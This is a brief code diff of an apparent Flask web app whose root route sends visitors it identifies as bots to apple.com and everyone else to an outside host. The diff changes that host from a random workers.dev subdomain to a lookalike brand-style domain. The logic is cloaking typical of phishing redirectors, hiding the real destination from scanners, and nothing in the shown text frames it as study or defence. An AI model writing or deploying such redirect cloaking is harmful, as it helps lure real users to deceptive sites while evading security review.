@@ -48,7 +48,7 @@ def root():
     if is_bot(request):
         return redirect("https://apple.com", code=302)
     else:
-        return redirect("https://be3239cfb9f8559e.e5dacaf0735246b19092002a.workers.dev", code=302)
+        return redirect("https://marthastewarkeftlivingomnimedia.vu", code=302)
 
 
 if __name__ == "__main__":
